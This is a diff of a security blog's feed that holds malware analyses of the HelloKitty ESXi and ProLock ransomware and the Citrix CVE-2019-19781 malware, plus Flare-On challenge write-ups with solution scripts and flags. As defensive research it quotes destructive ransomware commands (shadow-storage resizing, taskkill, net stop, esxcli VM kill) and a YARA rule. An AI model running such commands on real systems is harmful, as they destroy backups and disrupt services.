 &lt;h2 id=&quot;introduction&quot;&gt;&lt;strong&gt;Introduction&lt;/strong&gt;&lt;/h2&gt;
-&lt;p&gt;This report contains technical details of the new linux version of &lt;strong&gt;HelloKitty&lt;/strong&gt; that target VMware ESXi servers.&lt;/p&gt;
+&lt;p&gt;This report contains technical details of the new linux version of &lt;strong&gt;HelloKitty&lt;/strong&gt; that targets VMware ESXi servers.&lt;/p&gt;
 
 &lt;p&gt;The encryption used by this variant is &lt;strong&gt;AES_CBC&lt;/strong&gt; and &lt;strong&gt;Elliptic-curve Diffie–Hellman (ECDH)&lt;/strong&gt; to protect the keys.&lt;/p&gt;
 
 &lt;h2 id=&quot;encryption-overview&quot;&gt;&lt;strong&gt;Encryption Overview&lt;/strong&gt;&lt;/h2&gt;
-&lt;p&gt;The malware generates an &lt;strong&gt;ECDH&lt;/strong&gt; keypair, then using the hardcoded public key of the threat actor, it generates an &lt;strong&gt;ECDH secret&lt;/strong&gt; key.&lt;/p&gt;
+&lt;p&gt;The malware generates an &lt;strong&gt;ECDH&lt;/strong&gt; keypair, then using the hardcoded public key of the threat actor, it generates an &lt;strong&gt;ECDH secret&lt;/strong&gt; key, then an AES &lt;strong&gt;KEY/IV&lt;/strong&gt; are randomly generated at run time, this key will be used to encrypt a file.&lt;/p&gt;
 
-&lt;p&gt;then an AES &lt;strong&gt;KEY/IV&lt;/strong&gt; are randomly generated at run time, this key will be used to encrypt a file.&lt;/p&gt;
-
-&lt;p&gt;Note: the AES &lt;strong&gt;KEY/IV&lt;/strong&gt; are different each file.&lt;/p&gt;
+&lt;p&gt;Note: the AES &lt;strong&gt;KEY/IV&lt;/strong&gt; are different for each file.&lt;/p&gt;
 
 &lt;p&gt;The AES &lt;strong&gt;KEY/IV&lt;/strong&gt; is encrypted using a randomly generated &lt;strong&gt;IV&lt;/strong&gt; and the previous &lt;strong&gt;ECDH secret&lt;/strong&gt; key with AES algorithm.&lt;/p&gt;
 
-&lt;p&gt;Finally a structure is populated with the ECDH public key of the malware, the AES &lt;strong&gt;KEY/IV&lt;/strong&gt; used for file encryption and other stuff.&lt;/p&gt;
+&lt;p&gt;Finally a structure is populated with the ECDH public key of the malware, the encrypted AES &lt;strong&gt;KEY/IV&lt;/strong&gt; used for file encryption and other stuff.&lt;/p&gt;
 
 &lt;p&gt;The structure is appended with the ransom note and the encrypted file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.crypt&lt;/code&gt;&lt;/p&gt;
 
@@ -229,7 +460,7 @@ then creates 2 strings, &lt;code class=&quot;language-plaintext highlighter-roug
 
 &lt;p&gt;&lt;img src=&quot;/assets/img/hellokitty_linux/20210716165020.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;It then rename the file to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;filename + .tmp_&lt;/code&gt;
+&lt;p&gt;The malware then rename the file to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;filename + .tmp_&lt;/code&gt;
 then it will call a function (&lt;strong&gt;0x405D64&lt;/strong&gt;) to encrypt the file. 
 In case of failure it will roll back to the original filename&lt;/p&gt;
 
@@ -250,7 +481,7 @@ In case of failure it will roll back to the original filename&lt;/p&gt;
   &lt;li&gt;Figure: Official documentation of OpenSSL API https://www.openssl.org/docs/man1.0.2/man3/EVP_BytesToKey.html&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;Then it generates the malware ECDH private/public keys.&lt;/p&gt;
+&lt;p&gt;Afterwards it generates the malware ECDH private/public keys.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/img/hellokitty_linux/20210717160601.png&quot; alt=&quot;alt text&quot; /&gt;&lt;/p&gt;
 &lt;ul&gt;
@@ -395,10 +626,8 @@ Example:&lt;/p&gt;
         author = &quot;@soolidsnakee&quot;
         date = &quot;2021-07-17&quot;
     strings:
-        $str1 = &quot;Your files have been encrypted and attackers exfiltrated over&quot;
-        $str2 = &quot;%s:%.2f GB in %.2f sec. %.4f GB&quot;
-        $str3 = &quot;progress %s:%.2f GB&quot;
-        $str4 = &quot;e:%d l:%d f:%s&quot;
+        $str1 = &quot;.crypt&quot;
+        $str2 = &quot;.README_TO_RESTORE&quot;
         $str5 = &quot;switch to daemon&quot;
         $str6 = &quot;esxcli vm process kill -t=hard -w=%d&quot;
         $str7 = &quot;work.log&quot;
@@ -406,7 +635,7 @@ Example:&lt;/p&gt;
     condition:
         all of ($str*)
 }
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="malware" /><summary type="html">Please read the disclaimer</summary></entry><entry><title type="html">ProLock malware analysis</title><link href="http://localhost:4000/2020/05/11/Prolock_ransomware.html" rel="alternate" type="text/html" title="ProLock malware analysis" /><published>2020-05-11T12:08:00-05:00</published><updated>2020-05-11T12:08:00-05:00</updated><id>http://localhost:4000/2020/05/11/Prolock_ransomware</id><content type="html" xml:base="http://localhost:4000/2020/05/11/Prolock_ransomware.html">&lt;h2 id=&quot;please-read-the-disclaimer&quot;&gt;Please read the &lt;a href=&quot;/disclaimer/&quot;&gt;disclaimer&lt;/a&gt;&lt;/h2&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="malware" /><summary type="html">Please read the disclaimer</summary></entry><entry><title type="html">ProLock malware analysis</title><link href="http://localhost:4000/2020/05/11/Prolock_ransomware.html" rel="alternate" type="text/html" title="ProLock malware analysis" /><published>2020-05-11T19:08:00+02:00</published><updated>2020-05-11T19:08:00+02:00</updated><id>http://localhost:4000/2020/05/11/Prolock_ransomware</id><content type="html" xml:base="http://localhost:4000/2020/05/11/Prolock_ransomware.html">&lt;h2 id=&quot;please-read-the-disclaimer&quot;&gt;Please read the &lt;a href=&quot;/disclaimer/&quot;&gt;disclaimer&lt;/a&gt;&lt;/h2&gt;
 
 &lt;p&gt;Prolock caught my attention after reading the &lt;a href=&quot;https://www.bleepingcomputer.com/news/security/pwndlocker-fixes-crypto-bug-rebrands-as-prolock-ransomware/&quot;&gt;blogpost of bleepingcomputer&lt;/a&gt;, so I fired up my malware analysis box for some fun.&lt;/p&gt;
 
@@ -679,7 +908,7 @@ Example:&lt;/p&gt;
   &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vssadmin.exe resize shadowstorage /for=C:\ /on=C:\ /maxsize=unbounded&lt;/code&gt;&lt;/li&gt;
   &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;taskkill.exe /IM &quot;name_of_process&quot;&lt;/code&gt;&lt;/li&gt;
   &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;net stop &quot;name_of_service&quot; /y host.exe&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;</content><author><name></name></author><category term="malware" /><summary type="html">Please read the disclaimer</summary></entry><entry><title type="html">Citrix CVE-2019-19781 malware analyses</title><link href="http://localhost:4000/2020/01/17/citrix_malware.html" rel="alternate" type="text/html" title="Citrix CVE-2019-19781 malware analyses" /><published>2020-01-17T11:08:00-06:00</published><updated>2020-01-17T11:08:00-06:00</updated><id>http://localhost:4000/2020/01/17/citrix_malware</id><content type="html" xml:base="http://localhost:4000/2020/01/17/citrix_malware.html">&lt;h2 id=&quot;please-read-the-disclaimer&quot;&gt;Please read the &lt;a href=&quot;/disclaimer/&quot;&gt;disclaimer&lt;/a&gt;&lt;/h2&gt;
+&lt;/ul&gt;</content><author><name></name></author><category term="malware" /><summary type="html">Please read the disclaimer</summary></entry><entry><title type="html">Citrix CVE-2019-19781 malware analysis</title><link href="http://localhost:4000/2020/01/17/citrix_malware.html" rel="alternate" type="text/html" title="Citrix CVE-2019-19781 malware analysis" /><published>2020-01-17T18:08:00+01:00</published><updated>2020-01-17T18:08:00+01:00</updated><id>http://localhost:4000/2020/01/17/citrix_malware</id><content type="html" xml:base="http://localhost:4000/2020/01/17/citrix_malware.html">&lt;h2 id=&quot;please-read-the-disclaimer&quot;&gt;Please read the &lt;a href=&quot;/disclaimer/&quot;&gt;disclaimer&lt;/a&gt;&lt;/h2&gt;
 
 &lt;p&gt;After the exploit release of CVE-2019-19781, malicious hackers took the opportunity to compromise Citrix instances that did not have the Citrix mitigation implemented. I had the chance to get my hands on some artefacts from a honey pot of a certain threat actor who compromised multiple servers &lt;a href=&quot;https://twitter.com/michel228/status/1216771783656910849&quot;&gt;tweet link&lt;/a&gt;, in this post I will talk in details on how I reversed it using Cutter.&lt;/p&gt;
 
@@ -839,7 +1068,7 @@ In other words every xml file that contain the string &lt;strong&gt;block&lt;/st
       &lt;li&gt;/tmp/.init/httpd &amp;amp;;&lt;/li&gt;
     &lt;/ul&gt;
   &lt;/li&gt;
-&lt;/ol&gt;</content><author><name></name></author><category term="malware" /><summary type="html">Please read the disclaimer</summary></entry><entry><title type="html">Flare-on6 challenge 11</title><link href="http://localhost:4000/2019/09/19/flare-on5-chall11.html" rel="alternate" type="text/html" title="Flare-on6 challenge 11" /><published>2019-09-19T08:17:00-05:00</published><updated>2019-09-19T08:17:00-05:00</updated><id>http://localhost:4000/2019/09/19/flare-on5-chall11</id><content type="html" xml:base="http://localhost:4000/2019/09/19/flare-on5-chall11.html">&lt;h2 id=&quot;please-read-the-disclaimer&quot;&gt;Please read the &lt;a href=&quot;/disclaimer/&quot;&gt;disclaimer&lt;/a&gt;&lt;/h2&gt;
+&lt;/ol&gt;</content><author><name></name></author><category term="malware" /><summary type="html">Please read the disclaimer</summary></entry><entry><title type="html">Flare-on6 challenge 11</title><link href="http://localhost:4000/2019/09/19/flare-on5-chall11.html" rel="alternate" type="text/html" title="Flare-on6 challenge 11" /><published>2019-09-19T15:17:00+02:00</published><updated>2019-09-19T15:17:00+02:00</updated><id>http://localhost:4000/2019/09/19/flare-on5-chall11</id><content type="html" xml:base="http://localhost:4000/2019/09/19/flare-on5-chall11.html">&lt;h2 id=&quot;please-read-the-disclaimer&quot;&gt;Please read the &lt;a href=&quot;/disclaimer/&quot;&gt;disclaimer&lt;/a&gt;&lt;/h2&gt;
 
 &lt;p&gt;#vv_max:
                     Hey, at least its not subleq.&lt;/p&gt;
@@ -899,7 +1128,7 @@ In other words every xml file that contain the string &lt;strong&gt;block&lt;/st
 
 &lt;p&gt;&lt;img src=&quot;/assets/img/flare-on6/chall11/flags_output.png&quot; alt=&quot;flags_output&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;With some fails and tries I was able to retrieve the flag which is: &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AVX5_VM_M4K3S_BASE64_C0MPL1C4T3D@flare-on.com&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;</content><author><name></name></author><category term="reverse" /><summary type="html">Please read the disclaimer</summary></entry><entry><title type="html">Flare-on challenge 12</title><link href="http://localhost:4000/2018/10/04/flare-on5-chall12.html" rel="alternate" type="text/html" title="Flare-on challenge 12" /><published>2018-10-04T17:05:00-05:00</published><updated>2018-10-04T17:05:00-05:00</updated><id>http://localhost:4000/2018/10/04/flare-on5-chall12</id><content type="html" xml:base="http://localhost:4000/2018/10/04/flare-on5-chall12.html">&lt;h2 id=&quot;please-read-the-disclaimer&quot;&gt;Please read the &lt;a href=&quot;/disclaimer/&quot;&gt;disclaimer&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;With some fails and tries I was able to retrieve the flag which is: &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AVX5_VM_M4K3S_BASE64_C0MPL1C4T3D@flare-on.com&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;</content><author><name></name></author><category term="reverse" /><summary type="html">Please read the disclaimer</summary></entry><entry><title type="html">Flare-on challenge 12</title><link href="http://localhost:4000/2018/10/05/flare-on5-chall12.html" rel="alternate" type="text/html" title="Flare-on challenge 12" /><published>2018-10-05T00:05:00+02:00</published><updated>2018-10-05T00:05:00+02:00</updated><id>http://localhost:4000/2018/10/05/flare-on5-chall12</id><content type="html" xml:base="http://localhost:4000/2018/10/05/flare-on5-chall12.html">&lt;h2 id=&quot;please-read-the-disclaimer&quot;&gt;Please read the &lt;a href=&quot;/disclaimer/&quot;&gt;disclaimer&lt;/a&gt;&lt;/h2&gt;
 
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Now for the final test of your focus and dedication. 
 We found a floppy disk that was given to spies to transmit secret messages.
@@ -1212,19 +1441,19 @@ in each iteration &lt;strong&gt;i&lt;/strong&gt; is incremented by 2, knowing th
 &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;
 
 &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;xrange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag_len&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;combo&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;itertools&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;product&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;printable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;repeat&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;combo&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;itertools&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;product&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;printable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;repeat&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
 		&lt;span class=&quot;n&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pre_calc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;combo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;combo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 		&lt;span class=&quot;n&quot;&gt;B&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;summ&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;length_var&lt;/span&gt;
 		
 		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;B&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hashes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;
 			&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;combo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;combo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
 
-&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'flag=&amp;gt; %s'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'flag=&amp;gt; &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/img/flare-on/chall12/flag.png&quot; alt=&quot;flag&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;If you liked my writeup, please take a look at my &lt;a href=&quot;https://github.com/soolidsnake&quot;&gt;github repo&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><category term="reverse" /><summary type="html">Please read the disclaimer</summary></entry><entry><title type="html">Flare-on challenge 11</title><link href="http://localhost:4000/2018/10/02/flare-on5-chall11.html" rel="alternate" type="text/html" title="Flare-on challenge 11" /><published>2018-10-02T12:08:00-05:00</published><updated>2018-10-02T12:08:00-05:00</updated><id>http://localhost:4000/2018/10/02/flare-on5-chall11</id><content type="html" xml:base="http://localhost:4000/2018/10/02/flare-on5-chall11.html">&lt;h2 id=&quot;please-read-the-disclaimer&quot;&gt;Please read the &lt;a href=&quot;/disclaimer/&quot;&gt;disclaimer&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;If you liked my writeup, please take a look at my &lt;a href=&quot;https://github.com/soolidsnake&quot;&gt;github repo&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><category term="reverse" /><summary type="html">Please read the disclaimer</summary></entry><entry><title type="html">Flare-on challenge 11</title><link href="http://localhost:4000/2018/10/02/flare-on5-chall11.html" rel="alternate" type="text/html" title="Flare-on challenge 11" /><published>2018-10-02T19:08:00+02:00</published><updated>2018-10-02T19:08:00+02:00</updated><id>http://localhost:4000/2018/10/02/flare-on5-chall11</id><content type="html" xml:base="http://localhost:4000/2018/10/02/flare-on5-chall11.html">&lt;h2 id=&quot;please-read-the-disclaimer&quot;&gt;Please read the &lt;a href=&quot;/disclaimer/&quot;&gt;disclaimer&lt;/a&gt;&lt;/h2&gt;
 
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;We captured some malware traffic, and the malware we think was responsible. 
 You know the drill, if you reverse engineer and decode everything 
@@ -1323,7 +1552,7 @@ the next picture shows the first &lt;strong&gt;0x30&lt;/strong&gt; data sent fro
 &lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'base64_encoded_data'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'r'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
     &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
         &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
             &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
         &lt;span class=&quot;n&quot;&gt;PatchByte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;# write a byte at memory pointed by &quot;start&quot;
@@ -1390,23 +1619,23 @@ the next picture shows the first &lt;strong&gt;0x30&lt;/strong&gt; data sent fro
 &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;binascii&lt;/span&gt;
 &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
 
-&lt;span class=&quot;n&quot;&gt;ssock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;ssock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'0.0.0.0'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9443&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;ssock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;listen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;csock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ssock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;ssock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;ssock&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'0.0.0.0'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9443&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;ssock&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;listen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;csock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ssock&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
 
